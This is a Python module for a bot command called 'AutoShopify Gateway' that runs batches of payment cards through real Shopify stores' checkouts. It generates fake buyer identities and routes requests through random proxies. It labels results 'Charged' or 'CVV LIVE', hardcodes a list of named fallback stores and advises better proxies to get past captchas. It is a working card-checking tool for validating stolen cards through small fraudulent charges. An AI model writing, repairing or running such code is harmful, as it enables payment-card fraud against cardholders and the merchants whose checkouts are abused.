"""
AutoShopify Gateway - Fixed and Improved Version
Fixes:
1. Better product fetching with retry logic
2. Improved error handling
3. Better store validation
4. Added fallback stores
"""

import aiohttp
import random
from utils import Utils, extract_between
from commands.base_command import BaseCommand, CommandType
from urllib.parse import urlparse
from bot import BotCache
import re
import asyncio

# Verified working Shopify stores with products
FALLBACK_STORES = [
    {"url": "wiredministries.com", "variant_id": ""},
    {"url": "shopnicekicks.com", "variant_id": ""},
    {"url": "culturekings.com.au", "variant_id": ""},
    {"url": "kith.com", "variant_id": ""},
    {"url": "deadstock.ca", "variant_id": ""},
]


async def fetchProducts(proxy, domain, timeout=15, retries=3):
    """
    Fetch products from a Shopify store with retry logic
    
    Args:
        proxy: Proxy string (http://user:pass@host:port)
        domain: Store domain (with or without https://)
        timeout: Request timeout in seconds
        retries: Number of retry attempts
    
    Returns:
        dict with product info or tuple (False, error_message)
    """
    # Normalize domain
    if not domain.startswith("http"):
        domain = "https://" + domain
    domain = domain.rstrip("/")
    
    for attempt in range(retries):
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                # Try to fetch products.json
                async with session.get(
                    f"{domain}/products.json?limit=250",
                    proxy=proxy if proxy else None,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'application/json',
                    }
                ) as resp:
                    if resp.status == 404:
                        return False, "<b>Products API not available!</b>"
                    if resp.status == 403:
                        return False, "<b>Access Denied - Try different proxy!</b>"
                    if resp.status != 200:
                        if attempt < retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return False, f"<b>Site Error! (Status: {resp.status})</b>"
                    
                    text = await resp.text()
                    
                    # Verify it's a Shopify store
                    if "shopify" not in text.lower() and "products" not in text.lower():
                        return False, "<b>Not a Shopify store!</b>"
                    
                    try:
                        data = await resp.json()
                        products = data.get('products', [])
                    except:
                        return False, "<b>Invalid JSON response!</b>"
                    
                    if not products:
                        return False, "<b>No Products Found!</b>"
                    
                    # Find the cheapest available product
                    min_price = float('inf')
                    min_product = None
                    
                    for product in products:
                        variants = product.get('variants', [])
                        if not variants:
                            continue
                        
                        for variant in variants:
                            # Check if variant is available
                            if not variant.get('available', True):
                                continue
                            
                            try:
                                price = variant.get('price', '0')
                                if isinstance(price, str):
                                    price = float(price.replace(',', '').replace('$', ''))
                                else:
                                    price = float(price)
                                
                                # Skip free products (often require special conditions)
                                if price <= 0:
                                    continue
                                
                                if price < min_price:
                                    min_price = price
                                    min_product = {
                                        'site': domain,
                                        'price': f"{price:.2f}",
                                        'variant_id': str(variant['id']),
                                        'link': f"{domain}/products/{product.get('handle', '')}",
                                        'title': product.get('title', 'Unknown'),
                                        'variant_title': variant.get('title', '')
                                    }
                            except (ValueError, TypeError, AttributeError):
                                continue
                    
                    if min_product and min_product.get('price'):
                        print(f"[Shopify] Found product: {min_product['title']} @ ${min_product['price']}")
                        return min_product
                    else:
                        return False, "<b>No Available Products!</b>"
                        
        except aiohttp.ClientError as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            return False, f"<b>Proxy/Network Error!</b>"
        except asyncio.TimeoutError:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            return False, "<b>Request Timeout!</b>"
        except Exception as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            return False, f"<b>Error: {str(e)[:50]}</b>"
    
    return False, "<b>Failed after retries!</b>"


async def process_card(cc, mes, ano, cvv, site=None, proxies=None):
    """
    Process a card through Shopify checkout
    
    Args:
        cc: Card number
        mes: Expiry month (MM)
        ano: Expiry year (YY or YYYY)
        cvv: CVV code
        site: ShopifySite object or list of sites
        proxies: List of Proxy objects
    
    Returns:
        tuple: (success, message, gateway_name) or (success, message, gateway, amount, currency)
    """
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8'
        }
        
        # Get proxy
        proxy_str = None
        if proxies:
            proxy = random.choice(proxies) if isinstance(proxies, list) else proxies
            proxy_str = f"http://{proxy.proxy}" if hasattr(proxy, 'proxy') else f"http://{proxy}"
        
        print(f"[Shopify] Using proxy: {proxy_str}")
        
        # Get site
        if isinstance(site, (list, tuple)):
            site = random.choice(site)
        
        # Extract URL and variant_id from site object
        if hasattr(site, 'url'):
            site_url = site.url
            variant_id = getattr(site, 'variant_id', '') or ''
        elif isinstance(site, dict):
            site_url = site.get('url', '')
            variant_id = site.get('variant_id', '')
        else:
            site_url = str(site)
            variant_id = ''
        
        # Normalize URL
        if not site_url.startswith('http'):
            ourl = 'https://' + site_url
        else:
            ourl = site_url
        ourl = ourl.rstrip('/')
        
        print(f"[Shopify] Processing on: {ourl}")
        
        # Generate user info
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        data = Utils.get_formatted_address()
        
        phone = data['phone']
        street = data['street']
        city = data['city']
        state = data['state']
        s_zip = data['zip']
        address2 = Utils.get_formatted_address()['street']
        
        # If no variant_id, fetch products
        if not variant_id:
            print(f"[Shopify] No variant_id, fetching products...")
            info = await fetchProducts(proxy_str, ourl)
            if isinstance(info, tuple) and len(info) == 2:
                # Try fallback stores
                print(f"[Shopify] Primary store failed: {info[1]}, trying fallbacks...")
                for fallback in FALLBACK_STORES:
                    fallback_url = f"https://{fallback['url']}"
                    info = await fetchProducts(proxy_str, fallback_url)
                    if isinstance(info, dict):
                        ourl = fallback_url
                        variant_id = info['variant_id']
                        print(f"[Shopify] Using fallback: {ourl}")
                        break
                else:
                    return False, info[1], ourl
            else:
                variant_id = info['variant_id']
        
        # Start checkout process
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            url = ourl
            cart_url = f"{url}/cart/add.js"
            checkout_url = f"{url}/checkout/"
            
            # Add to cart
            try:
                async with session.post(
                    cart_url,
                    data={'id': variant_id, 'quantity': 1},
                    headers=headers,
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as cart_resp:
                    if cart_resp.status not in [200, 302]:
                        print(f"[Shopify] Cart add failed: {cart_resp.status}")
            except Exception as e:
                print(f"[Shopify] Cart error: {e}")
            
            # Navigate to checkout
            try:
                async with session.post(
                    checkout_url,
                    headers=headers,
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=20),
                    allow_redirects=True
                ) as checkout_resp:
                    checkout_url = str(checkout_resp.url)
                    text = await checkout_resp.text()
            except Exception as e:
                return False, f"Checkout Error: {str(e)[:30]}", ourl
            
            # Check for login requirement
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", ourl
            
            # Extract session tokens
            sst = extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
            if not sst:
                # Try alternative extraction
                sst = extract_between(text, 'sessionToken":"', '"')
            
            if not sst:
                # Retry once
                try:
                    async with session.get(
                        checkout_url,
                        headers=headers,
                        proxy=proxy_str,
                        timeout=aiohttp.ClientTimeout(total=15)
                    ) as retry_resp:
                        text = await retry_resp.text()
                        sst = extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
                except:
                    pass
            
            if not sst:
                return False, "Failed to get session token!", ourl
            
            # Extract other tokens
            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&q') or ''
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&q') or ''
            displayName = extract_between(text, 'extensibilityDisplayName&quot;:&quot;', '&q') or 'Shopify'
            
            # Extract currency
            currency_match = re.search(r'currencycode\s*[:=]\s*["\']?([A-Z]{3})["\']?', text, re.IGNORECASE)
            currency = currency_match.group(1).upper() if currency_match else 'USD'
            
            # Extract subtotal
            subtotal = extract_between(text, 'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
            if not subtotal:
                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
            running_total = subtotal or '0.00'
            
            # GraphQL endpoint
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            params = {'operationName': 'Proposal'}
            
            # Build shipping proposal request (simplified for brevity)
            # This is the first GraphQL mutation to set shipping address
            shipping_json = {
                'query': 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery},queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}}}}}}',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street,
                                    'address2': address2,
                                    'city': city,
                                    'countryCode': 'US',
                                    'postalCode': s_zip,
                                    'firstName': firstName,
                                    'lastName': lastName,
                                    'zoneCode': state,
                                    'phone': phone,
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True},
                                }
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                        }]
                    }
                },
                'operationName': 'Proposal',
            }
            
            # Send shipping proposal
            try:
                async with session.post(
                    graphql_url,
                    params=params,
                    headers={**headers, 'Content-Type': 'application/json'},
                    json=shipping_json,
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as ship_resp:
                    ship_text = await ship_resp.text()
                    
                    if 'CAPTCHA' in ship_text.upper():
                        return False, "Captcha Required - Use better proxies!", displayName
                    
                    # Extract shipping handle
                    ship_handle = extract_between(ship_text, '"handle":"', '"') or 'shopify-standard'
            except Exception as e:
                return False, f"Shipping Error: {str(e)[:30]}", displayName
            
            # Tokenize card with Shopify
            card_formatted = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
            
            try:
                async with session.post(
                    'https://deposit.shopifycs.com/sessions',
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                    },
                    json={
                        'credit_card': {
                            'number': card_formatted,
                            'name': f"{firstName} {lastName}",
                            'month': int(mes),
                            'year': int(f"20{ano}" if len(ano) == 2 else ano),
                            'verification_value': cvv
                        }
                    },
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as token_resp:
                    token_data = await token_resp.json()
                    payment_token = token_data.get('id', '')
                    
                    if not payment_token:
                        return False, "Card tokenization failed!", displayName
            except Exception as e:
                return False, f"Token Error: {str(e)[:30]}", displayName
            
            # Submit payment (simplified GraphQL mutation)
            submit_json = {
                'query': 'mutation SubmitForCompletion($sessionInput:SessionTokenInput!,$payment:PaymentTermInput){session(sessionInput:$sessionInput){submitForCompletion(input:{payment:$payment}){__typename receipt{...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}}}}}}}',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'payment': {
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'sessionId': payment_token,
                                    'paymentMethodIdentifier': 'https://ns.shopify.com/credit-card',
                                    'billingAddress': {
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'zoneCode': state,
                                        'postalCode': s_zip,
                                        'phone': phone,
                                    }
                                }
                            }
                        }]
                    }
                },
                'operationName': 'SubmitForCompletion',
            }
            
            try:
                async with session.post(
                    graphql_url,
                    params={'operationName': 'SubmitForCompletion'},
                    headers={**headers, 'Content-Type': 'application/json'},
                    json=submit_json,
                    proxy=proxy_str,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as submit_resp:
                    submit_text = await submit_resp.text()
            except Exception as e:
                return False, f"Submit Error: {str(e)[:30]}", displayName
            
            # Parse response
            text = submit_text.lower()
            
            # Check for various responses
            if 'your order total has changed' in text:
                return False, "Order total changed - Site issue!", ourl
            
            if 'payment method is not available' in text or 'requested payment method' in text:
                return False, "Payment method not supported!", displayName
            
            if 'captcha' in text:
                return False, "Captcha Required - Use better proxies!", displayName
            
            # Extract error code if present
            code = extract_between(submit_text, '"code":"', '"') or ''
            
            # Check for success indicators
            if 'actionrequired' in text or '3d' in text.lower():
                return False, "3D Secure Required", displayName
            
            if 'processingerror' not in text and ('receipt' in text or 'processed' in text):
                return True, f"Charged! - {code or 'Success'}", displayName, running_total, currency
            
            # Check for CVV/live card indicators
            if any(err in text for err in ['incorrect_zip', 'zip']):
                return True, "Incorrect Zip Code - CVV LIVE", displayName
            
            if any(err in text for err in ['insufficient_funds', 'insuff']):
                return True, "Insufficient Funds - LIVE", displayName
            
            if any(err in text for err in ['invalid_cvc', 'incorrect_cvc', 'cvc']):
                return True, f"CVV Error - {code}", displayName
            
            if 'processingerror' in text:
                return False, code or "Processing Error", displayName
            
            # Default decline
            return False, code or "Card Declined", displayName
            
    except Exception as e:
        print(f'[Shopify] Error: {str(e)}')
        return False, "Error Processing Card!", ourl if 'ourl' in locals() else "Unknown"


async def register_shopify_gateway(bot):
    """Register the Shopify gateway command"""
    base_command = BaseCommand(
        bot=bot,
        name="Shopify",
        cmd="sh",
        handler=process_card,
        cmd_type=CommandType.MASS,
        premium=False,
        amount='Custom',
        status=True
    )
    base_command.register_command()
